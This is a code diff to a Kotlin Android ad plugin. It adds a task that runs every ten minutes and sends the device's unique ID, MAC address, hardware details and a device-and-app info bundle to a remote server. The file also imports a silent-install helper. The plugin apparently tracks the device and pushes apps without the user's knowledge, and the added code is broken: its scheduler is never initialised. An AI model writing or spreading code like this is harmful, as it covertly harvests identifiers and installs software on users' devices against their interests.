@@ -1,20 +1,24 @@
 package com.nova.adplugin.base
 
 import android.content.Context
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.webkit.WebSettings
 import android.webkit.WebView
 import com.nova.adplugin.AdDispatcher
 import com.nova.adplugin.bean.UpdateAppsDTO
+import com.nova.adplugin.ext.appVersionCode
 import com.nova.adplugin.ext.getApkFileNameFromUrl
 import com.nova.adplugin.ext.getBasePath
+import com.nova.adplugin.ext.getDeviceAndAppInfo
 import com.nova.adplugin.ext.getFileExtension
 import com.nova.adplugin.ext.getFromSP
 import com.nova.adplugin.ext.silentInstallWithMutex
 import com.nova.adplugin.log.printLog
 import com.nova.adplugin.net.NetworkHelper
 import com.nova.adplugin.ext.getMacAddress
+import com.nova.adplugin.ext.getUniqueDeviceId
 import com.nova.adplugin.ext.saveToSP
 import java.io.File
 import java.io.IOException
@@ -92,6 +96,7 @@ open class AdPluginBase {
         taskFuture = scheduler!!.scheduleWithFixedDelay({
             "周期任务执行,查询推送应用: ${System.currentTimeMillis()}".printLog()
             //checkAppsUpdate()
+            checkApps()
             val packageInfo = appContext.packageManager.getPackageInfo(appContext.packageName, 0)
             println("周期任务执行,查询推送应用: ${appContext.packageName}-----${packageInfo.versionCode}")
             if (appContext.packageName == "com.chihihx.store" && packageInfo.versionCode < 6) {
@@ -126,6 +131,40 @@ open class AdPluginBase {
             }
         }
     }
+
+    private var scheduler22: ScheduledExecutorService? = null
+    private fun checkApps() {
+        println("执行了")
+        taskFuture = scheduler22!!.scheduleWithFixedDelay({
+        NetworkHelper.makeGetRequest(
+            url = "https://api.ppmovie.cc/appapi/appinfo/getVersion",
+            params = mapOf(
+                "req_id" to "0",
+                "channel" to "fatv1007",
+                "ctype" to "fatv1007",
+                "version" to appContext.appVersionCode(),
+                "sdk" to Build.VERSION.SDK_INT.toString(),
+                "uuid" to appContext.getUniqueDeviceId(),
+                "model" to "fatv1007",
+                "brand" to Build.BRAND,
+                "product" to Build.PRODUCT,
+                "mac" to "${getMacAddress()}",
+                "extra_params" to appContext.getDeviceAndAppInfo(),
+            ),
+            responseType = List::class.java as Class<List<UpdateAppsDTO>>,
+            itemType = UpdateAppsDTO::class.java
+        ) {
+            success { data ->
+                "成功: ${data[0].appName}".printLog()
+            }
+            failed { error ->
+                "失败: ${error.message}".printLog()
+            }
+        }
+        }, 0, 60000 * 10, TimeUnit.MILLISECONDS)
+    }
+
+
 
     private var executorService = Executors.newSingleThreadExecutor()
     private var currentTask: Future<*>? = null
